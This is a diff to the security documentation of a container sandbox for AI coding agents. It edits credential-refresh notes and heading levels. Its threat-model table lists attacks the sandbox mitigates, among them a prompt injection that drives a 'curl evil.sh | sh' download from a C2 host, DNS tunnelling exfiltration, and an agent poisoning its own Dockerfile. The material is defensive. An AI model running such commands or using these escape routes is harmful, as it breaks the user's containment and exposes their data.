@@ -225,10 +225,9 @@ for as long as possible and make any shortfall visible:
   host login, so you need to re-authenticate on the host and re-run to re-stage
   afterward. Sessions are not killed at the deadline. For OpenCode, the
   soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
-  providers carry no host-logout risk and show no warning. Pi's `auth.json`
-  shape is not yet parsed by this check (deferred; see `TODO.md`), so no
-  expiry warning is shown for Pi and the in-container agent's own refresh
-  behavior applies.
+  providers carry no host-logout risk and show no warning. Pi's `auth.json` shape
+  is not yet parsed by this check, so no expiry warning is shown for Pi and the
+  in-container agent's own refresh behavior applies.
 - `--no-forward-credentials` starts the container unauthenticated. Host
   credentials are not read, staged, or mounted; other sessions' and persistent
   devcontainer inputs are preserved, and the generated
@@ -436,8 +435,8 @@ Customize:
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
-| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
-| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
+| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized. |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings. |
 | API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; CLI staging files are kept in private per-session storage. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
 | Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
 | Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |
@@ -479,9 +478,11 @@ The tool does not protect against:
 - **`ip6tables` unavailable.** The script attempts
   `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script
   aborts with an error.
-- **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the
-  `/tmp` credential staging directory from the host agent config or macOS
-  Keychain. The CLI also refreshes a near-expiry host Claude token before staging
+- **Credentials look stale.** Direct CLI runs stage fresh credentials into
+  [private session inputs](#private-session-inputs) on every launch. For
+  devcontainers, re-run `project-sandbox` on the host to refresh the `/tmp`
+  credential staging directory from the host agent config or macOS Keychain.
+  The CLI also refreshes a near-expiry host Claude or Codex token before staging
   unless `--no-token-refresh` is set.
 - **Env vars in `vminitd.log`.** apple/container logs the full process
   environment. Default forwarded agent tokens are passed through mounted
@@ -528,7 +529,7 @@ The tool does not protect against:
   exists (delete or merge it first, or omit the flag to reuse the existing one).
 - `jj` is installed in the container and configured with the same global
   name/email identity passed to Git.
-# Agent gateway boundary
+## Agent gateway boundary
 
 Proxy mode provides provider-credential isolation, not immunity from local
 spend. OpenAI/Anthropic keys and host OAuth state are excluded, but the agent
@@ -554,7 +555,7 @@ and never expose an unauthenticated listener. The external gateway's SQLite
 request log can contain complete prompts and responses; follow its retention,
 inspection, and pruning guidance before using sensitive material.
 
-## Remote proxy endpoints
+### Remote proxy endpoints
 
 Agent and Internet proxies can independently use HTTP loopback forwarding or
 direct remote HTTP/HTTPS. Internet mode retains default-deny IPv4/IPv6 and
@@ -578,7 +579,7 @@ origin. Internet proxy authentication and client certificates are unsupported;
 HTTP 407 does not trigger credential acquisition or direct fallback. See
 [proxy endpoints](proxy-endpoints.md) for TLS scope and client limitations.
 
-## Egress sidecar
+### Egress sidecar
 
 `--egress sidecar` replaces IP pinning with one global Squid sidecar per
 runtime that filters by hostname; see [Egress sidecar](egress-sidecar.md). The
